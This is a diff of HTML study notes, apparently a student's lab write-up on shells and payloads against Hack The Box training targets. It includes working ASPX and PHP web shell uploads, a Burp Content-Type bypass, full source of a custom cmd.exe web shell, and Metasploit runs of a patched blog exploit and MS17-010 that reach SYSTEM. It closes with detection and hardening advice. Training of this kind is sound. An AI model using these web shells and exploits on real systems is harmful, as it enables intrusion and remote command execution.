+                    <li>Bridges web exploitation and OS-level access.</li>
                 </ul>
+                <h4>12.2 – Typical Workflow</h4>
+                <ul>
+                    <li>Exploit upload/RCE/LFI in the web app.</li>
+                    <li>Drop a shell file into a web-accessible directory.</li>
+                    <li>Hit it via URL, pass commands as parameters.</li>
+                    <li>Use it to enumerate, then ideally drop a more stable reverse shell.</li>
+                </ul>
+                <h4>12.3 – Pros & Cons</h4>
+                <ul>
+                    <li><strong>Pros:</strong> rides HTTP/S (often allowed), tiny scripts, can be disguised as images.</li>
+                    <li><strong>Cons:</strong> clunky / non-interactive, noisy in logs, can be easily removed once found.</li>
+                </ul>
+                <div class="highlight-box">
+                    <strong>Goal:</strong> use web shells as a <em>bridge</em>, not a permanent home – pivot to a proper reverse/TTY shell ASAP.
+                </div>
             </div>
 
             <!-- Section 13 -->
             <div class="section">
-                <h3>13 / 17 – Laudanum ASPX Shell Walk-through</h3>
+                <h3>13 / 17 – Laudanum ASPX Web Shell (IIS)</h3>
+                <h4>13.1 – Goal</h4>
                 <ul>
-                    <li>Target: 10.129.42.197 (Windows Server 2019, IIS 10.0).</li>
-                    <li>I identified an upload form at <code>status.inlanefreight.local</code>.</li>
-                    <li>I copied the Laudanum ASPX shell from my Kali build.</li>
+                    <li>Use a Laudanum <strong>ASPX</strong> web shell against a Windows Server 2019 / IIS 10 target.</li>
+                    <li>Upload the shell via a vulnerable “Import configuration file” feature.</li>
+                </ul>
+                <h4>13.2 – Target & vHost</h4>
+                <ul>
+                    <li>Target: <code>10.129.42.197</code> (IIS 10, Tomcat 10, etc.).</li>
                 </ul>
                 <div class="command-block">
-                    <code>cp /usr/share/laudanum/aspx/shell.aspx /home/htb-student/demo.aspx</code>
+                    <code>echo "10.129.42.197 inlanefreight.local status.inlanefreight.local" | sudo tee -a /etc/hosts</code>
                 </div>
+                <p><code>http://status.inlanefreight.local/</code> exposes the status portal + upload form.</p>
+                <h4>13.3 – Laudanum Location</h4>
+                <div class="command-block">
+                    <code>ls /usr/share/laudanum/aspx
+cp /usr/share/laudanum/aspx/shell.aspx /home/htb-student/demo.aspx</code>
+                </div>
+                <p>Laudanum ASPX path: <code>/usr/share/laudanum/aspx</code>.</p>
+                <h4>13.4 – Editing & Uploading</h4>
                 <ul>
-                    <li>I edited the file to whitelist my attack IP.</li>
-                    <li>I uploaded the shell via the web app.</li>
-                    <li>I executed the shell by navigating to <code>http://status.inlanefreight.local/files/demo.aspx</code>.</li>
-                    <li><strong>Challenge:</strong> Understanding that the IIS worker process directory (where commands execute) differs from the web root directory (where the payload is stored).</li>
+                    <li>Edited <code>demo.aspx</code> to add my VPN IP to allowed IPs.</li>
+                    <li>Uploaded via “Import configuration file” on the status page.</li>
+                </ul>
+                <p>The app reported:</p>
+                <div class="command-block">
+                    <code>C:\inetpub\wwwroot\status.inlanefreight.local\files\demo.aspx</code>
+                </div>
+                <p>Final URL:</p>
+                <div class="command-block">
+                    <code>http://status.inlanefreight.local/files/demo.aspx</code>
+                </div>
+                <h4>13.5 – Landing Directory</h4>
+                <p>From the Laudanum shell UI:</p>
+                <div class="command-block">
+                    <code>echo %CD%</code>
+                </div>
+                <div class="success-box">
+                    <strong>Landing directory:</strong> <code>c:\windows\system32\inetsrv</code>.
+                </div>
+                <h4>13.6 – Mental Notes</h4>
+                <ul>
+                    <li>File path on disk ≠ working directory of the IIS worker process.</li>
+                    <li>Paths I care about:</li>
+                    <ul>
+                        <li>Web content: <code>C:\inetpub\wwwroot\status.inlanefreight.local\files\demo.aspx</code></li>
+                        <li>Process working dir: <code>c:\windows\system32\inetsrv</code></li>
+                        <li>Attacker Laudanum: <code>/usr/share/laudanum/aspx</code></li>
+                    </ul>
+                </ul>
+            </div>
+
+            <!-- Section 14 -->
+            <div class="section">
+                <h3>14 / 17 – Antak ASPX Web Shell (Nishang)</h3>
+                <h4>14.1 – Key Ideas</h4>
+                <ul>
+                    <li><strong>ASPX</strong> = ASP.NET pages, ideal for Windows/IIS web shells.</li>
+                    <li><strong>Antak</strong> (Nishang) = PowerShell console in the browser.</li>
+                    <li>Each command runs as a new PowerShell process; no persistent working dir.</li>
+                </ul>
+                <h4>14.2 – Antak Location on Pwnbox</h4>
+                <div class="command-block">
+                    <code>ls /usr/share/nishang/Antak-WebShell
+# antak.aspx  Readme.md</code>
+                </div>
+                <div class="success-box">
+                    <strong>Path:</strong> <code>/usr/share/nishang/Antak-WebShell/antak.aspx</code>.
+                </div>
+                <h4>14.3 – Copy & Modify</h4>
+                <div class="command-block">
+                    <code>cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/Upload.aspx
+nano ~/Upload.aspx</code>
+                </div>
+                <p>Edited the login check, e.g.:</p>
+                <div class="command-block">
+                    <code>if (Username.Text == "htb-student" && Password.Text == "htb-student") { ... }</code>
+                </div>
+                <p>(Optional: strip banners/comments for OPSEC/AV evasion.)</p>
+                <h4>14.4 – Uploading & Accessing Antak</h4>
+                <ul>
+                    <li>Same status portal upload as Laudanum: <code>http://status.inlanefreight.local/</code>.</li>
+                    <li>Upload <code>Upload.aspx</code>, which lands in <code>\files\</code>.</li>
+                </ul>
+                <div class="command-block">
+                    <code>http://status.inlanefreight.local/files/Upload.aspx</code>
+                </div>
+                <p>Login with the custom creds (<code>htb-student / htb-student</code>).</p>
+                <h4>14.5 – Using Antak</h4>
+                <ul>
+                    <li><code>help</code> – usage info.</li>
+                    <li><code>clear</code> – clears Antak output.</li>
+                    <li><code>whoami</code> – run simple commands via “Submit”.</li>
+                </ul>
+                <div class="command-block">
+                    <code>whoami</code>
+                </div>
+                <div class="success-box">
+                    <strong>Which user runs commands?</strong><br>
+                    Antak returns: <code>IIS APPPOOL\status</code> (format: <code>****\****</code> with a space).
+                </div>
+                <h4>14.6 – Laudanum vs Antak (When I Use Which)</h4>
+                <ul>
+                    <li><strong>Laudanum ASPX:</strong> quick cmd-style RCE, low friction, lighter footprint.</li>
+                    <li><strong>Antak ASPX:</strong> heavier but powerful for PowerShell scripts, DB hunting via <code>web.config</code>, bulk uploads/downloads.</li>
+                    <li>Typical workflow: Laudanum to prove RCE → Antak (or reverse shell) for serious post-ex.</li>
+                </ul>
+            </div>
+
+            <!-- Section 15 -->
+            <div class="section">
+                <h3>15 / 17 – PHP Web Shells in rConfig</h3>
+                <h4>15.1 – Key Ideas</h4>
+                <ul>
+                    <li>PHP dominates many web stacks; a PHP shell is often an option.</li>
+                    <li>File upload features + weak validation = classic PHP web shell vector.</li>
+                    <li>We can bypass filters by intercepting and editing the upload request.</li>
+                </ul>
+                <h4>15.2 – Target & Login</h4>
+                <ul>
+                    <li>Target: <code>10.129.201.101</code> (rConfig).</li>
+                    <li>Login: <code>admin / admin</code> for this lab.</li>
+                </ul>
+                <h4>15.3 – WhiteWinterWolf PHP Shell Upload</h4>
+                <ul>
+                    <li>Prepared <code>connect.php</code> with WhiteWinterWolf web shell.</li>
+                    <li>Used rConfig’s vendor logo upload (Devices → Vendors → Add Vendor).</li>
+                </ul>
+                <h4>15.4 – Bypassing Content-Type with Burp</h4>
+                <div class="command-block">
+                    <code># In intercepted multipart section:
+Content-Disposition: form-data; name="vendorlogo"; filename="connect.php"
+Content-Type: application/x-php
+
+# Change to:
+Content-Type: image/gif</code>
+                </div>
+                <div class="success-box">
+                    <strong>Lab answer:</strong> required <code>Content-Type</code> is <code>image/gif</code>.
+                </div>
+                <p>After forwarding the modified request, rConfig accepts the upload.</p>
+                <h4>15.5 – Accessing the PHP Web Shell</h4>
+                <p>Vendor logos are stored under <code>/images/vendor/</code> on the web root:</p>
+                <div class="command-block">
+                    <code>http://10.129.201.101/images/vendor/connect.php</code>
+                </div>
+                <p>This loads the WhiteWinterWolf web shell interface.</p>
+                <h4>15.6 – GIF Filename Question</h4>
+                <p>From a shell on the host:</p>
+                <div class="command-block">
+                    <code>ls -la /var/www/html/images/vendor</code>
+                </div>
+                <p>Identified the default “torn paper” icon:</p>
+                <div class="success-box">
+                    <strong>GIF filename:</strong> <code>ajax-loader.gif</code>.
+                </div>
+                <h4>15.7 – Notes</h4>
+                <ul>
+                    <li>Web shells are usually short-lived and clunky – use them to stage a better shell.</li>
+                    <li>Clean up payloads and document filenames/paths for the final report.</li>
+                </ul>
+            </div>
+
+            <!-- Section 16 -->
+            <div class="section">
+                <h3>16 / 17 – Live Engagement / Skills Assessment</h3>
+                <h4>16.1 – Scenario & Internal Network</h4>
+                <ul>
+                    <li>Foothold via RDP: <code>10.129.204.126</code> as <code>htb-student / [REDACTED]</code>.</li>
+                    <li>Discovered internal subnet <code>172.16.1.0/24</code> from that host.</li>
+                    <li>Mapped:</li>
+                    <ul>
+                        <li><code>172.16.1.11</code> – Windows IIS + Tomcat.</li>
+                        <li><code>172.16.1.12</code> – Ubuntu + Apache (blog).</li>
+                        <li><code>172.16.1.13</code> – Windows Server 2016.</li>
+                    </ul>
+                </ul>
+                <h4>16.2 – Host-1: Custom ASPX Shell (172.16.1.11)</h4>
+                <ul>
+                    <li>Target: <code>status.inlanefreight.local</code>.</li>
+                    <li>Discovered hostname <code>shells-winsvr</code> on the status page.</li>
+                    <li>Initial Laudanum upload returned 404 due to IP allow-list in the script.</li>
+                </ul>
+                <p><strong>Custom ASPX payload:</strong></p>
+                <div class="command-block">
+                    <code>&lt;%@ Page Language="C#" %&gt;
+&lt;%
+    if (!string.IsNullOrEmpty(Request["c"])) {
+        System.Diagnostics.ProcessStartInfo psi =
+            new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + Request["c"]);
+        psi.RedirectStandardOutput = true;
+        psi.RedirectStandardError = true;
+        psi.UseShellExecute = false;
+        psi.CreateNoWindow = true;
+        var p = System.Diagnostics.Process.Start(psi);
+        string o = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
+        Response.Write("&lt;pre&gt;" + o.Replace("&lt;", "&amp;lt;") + "&lt;/pre&gt;");
+    } else {
+        Response.Write("OK");
+    }
+%&gt;</code>
+                </div>
+                <p>Uploaded this simpler shell to bypass IP checks and executed commands via <code>?c=</code> parameter.</p>
+                <div class="success-box">
+                    <strong>Answers:</strong><br>
+                    - Hostname: <code>shells-winsvr</code><br>
+                    - Directory name in <code>C:\Shares</code>: <code>dev-share</code>
+                </div>
+                <h4>16.3 – Host-2: Ubuntu Blog & Exploit Fix (172.16.1.12)</h4>
+                <ul>
+                    <li>Target vHost: <code>blog.inlanefreight.local</code>, “Inlanefreight Gabber” CMS.</li>
+                    <li><strong>Credentials:</strong> Recon/lab hint revealed active blog credentials intended for team members: <code>admin / [REDACTED]</code>.</li>
                 </ul>
                 <div class="success-box">
-                    <strong>Landing Directory Verification:</strong> I executed <code>echo %CD%</code> in the web shell interface. The IIS process returned <code>[REDACTED]</code>.
+                    <strong>Q3 – Distro:</strong> <code>ubuntu</code>.
+                </div>
+                <p>Lab pointed to exploit <code>50064.rb</code> (lightweight blog): php webapp RCE.</p>
+                <div class="success-box">
+                    <strong>Q4 – Shell language:</strong> <code>php</code>.
+                </div>
+                <p><strong>Issue:</strong> Metasploit module broke due to changed CSRF handling (“unexpected json response”).</p>
+                <p><strong>Fix:</strong></p>
+                <ul>
+                    <li>Captured a valid CSRF token in browser DevTools.</li>
+                    <li>Edited local 50064.rb to hardcode <code>token = '6258e0f750'</code>.</li>
+                    <li>Placed patched file into <code>~/.msf4/modules/exploits/php/webapps/lightweight_blog_50064.rb</code>.</li>
+                </ul>
+                <div class="command-block">
+                    <code>use exploit/php/webapps/lightweight_blog_50064
+set RHOSTS 172.16.1.12
+set VHOST blog.inlanefreight.local
+set RPORT 80
+set TARGETURI /
+set USERNAME admin
+set PASSWORD [REDACTED]
+set LHOST 10.10.14.235
+run</code>
+                </div>
+                <p>Module successfully uploaded a PHP shell and opened a Meterpreter session; I dropped to a shell and retrieved the flag.</p>
+                <div class="success-box">
+                    <strong>Q5 – Flag:</strong> <code>[REDACTED]</code>.
+                </div>
+                <h4>16.4 – Host-3: MS17-010 Again (172.16.1.13)</h4>
+                <ul>
+                    <li>Target: <code>172.16.1.13</code> (Windows Server 2016).</li>
+                    <li>SMB and HTTP open; Nmap’s SMB scripts showed hostname.</li>
+                </ul>
+                <div class="success-box">
+                    <strong>Q6 – Hostname:</strong> <code>SHELLS-WINBLUE</code>.
+                </div>
+                <p><strong>Attempt 1:</strong> <code>exploit/windows/smb/ms17_010_eternalblue</code> – overwrite succeeded but no session (timeout).</p>
+                <p><strong>Working approach:</strong></p>
+                <div class="command-block">
+                    <code>use exploit/windows/smb/ms17_010_psexec
+set RHOSTS 172.16.1.13
+set LHOST 172.16.1.5
+set SMBUser administrator
+set SMBPass [REDACTED]
+set NAMEDPIPE /usr/share/metasploit-framework/data/wordlists/named_pipes.txt
+exploit</code>
+                </div>
+                <p>Got Meterpreter as <code>NT AUTHORITY\SYSTEM</code>, dropped to shell, and read the Skills Assessment flag.</p>
+                <div class="command-block">
+                    <code>meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; shell
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+
+C:\Windows\system32&gt;hostname
+SHELLS-WINBLUE
+
+C:\Windows\system32&gt;type "C:\Users\Administrator\Desktop\Skills-flag.txt"
+[REDACTED]</code>
+                </div>
+                <div class="success-box">
+                    <strong>Q7 – Flag:</strong> <code>[REDACTED]</code>.
                 </div>
             </div>
 
-            <!-- Section 14 (Placeholder) -->
+            <!-- Section 17 -->
             <div class="section">
-                <h3>14 / 17 – [Reserved for Future Content]</h3>
+                <h3>17 / 17 – Detection & Prevention (Blue-Team Lens)</h3>
+                <h4>17.1 – Core Detection Pillars</h4>
                 <ul>
-                    <li><em>Add your notes for Section 14 here.</em></li>
+                    <li><strong>Initial Access:</strong> anomalous auth/exploit attempts on web, RDP, SMB, VPN.</li>
+                    <li><strong>Execution:</strong> suspicious PowerShell/bash activity, strange binaries in temp.</li>
+                    <li><strong>C2:</strong> odd outbound HTTP/S, DNS, or high ports like <code>4444</code>.</li>
                 </ul>
-            </div>
-
-            <!-- Section 15 (Placeholder) -->
-            <div class="section">
-                <h3>15 / 17 – [Reserved for Future Content]</h3>
+                <h4>17.2 – High-Yield Blue-Team Wins</h4>
                 <ul>
-                    <li><em>Add your notes for Section 15 here.</em></li>
+                    <li>Alert when <code>.php</code>/<code>.aspx</code> land in web-facing image/uploads dirs.</li>
+                    <li>Monitor service accounts (<code>www-data</code>, IIS apppools) spawning shells.</li>
+                    <li>Baseline NetFlow and flag new external destinations or spiky POSTs from servers.</li>
                 </ul>
-            </div>
-
-            <!-- Section 16 (Placeholder) -->
-            <div class="section">
-                <h3>16 / 17 – [Reserved for Future Content]</h3>
+                <h4>17.3 – Network Visibility</h4>
                 <ul>
-                    <li><em>Add your notes for Section 16 here.</em></li>
+                    <li>Accurate asset inventory + network map.</li>
+                    <li>DPI / IDS/IPS at chokepoints.</li>
+                    <li>Centralised logs (proxy, firewall, VPN gateways, NetFlow).</li>
                 </ul>
-            </div>
-
-            <!-- Section 17 (Placeholder) -->
-            <div class="section">
-                <h3>17 / 17 – [Reserved for Future Content]</h3>
+                <h4>17.4 – Endpoint Hardening</h4>
                 <ul>
-                    <li><em>Add your notes for Section 17 here.</em></li>
+                    <li>AV/EDR everywhere, including web servers.</li>
+                    <li>PowerShell script block logging + Sysmon (Event ID 1 for process creation).</li>
+                    <li>Aggressive patching to kill “evergreen” exploits like MS17-010.</li>
+                </ul>
+                <h4>17.5 – Architectural Mitigations</h4>
+                <ul>
+                    <li><strong>Least privilege:</strong> no local admin by default, tight <code>sudo</code> rules.</li>
+                    <li><strong>Segmentation:</strong> DMZ isolated, SMB/RDP blocked where not required.</li>
+                    <li><strong>Egress filtering:</strong> deny-by-default outbound from servers; allowlist only what’s needed.</li>
+                </ul>
+                <h4>17.6 – Attacker Mental Model</h4>
+                <ul>
+                    <li>Every shell leaves network + endpoint artifacts.</li>
+                    <li>Assume uploads and interactive commands are monitored.</li>
+                    <li>Real stealth means living off the land and blending with normal admin behaviour.</li>
                 </ul>
             </div>
 
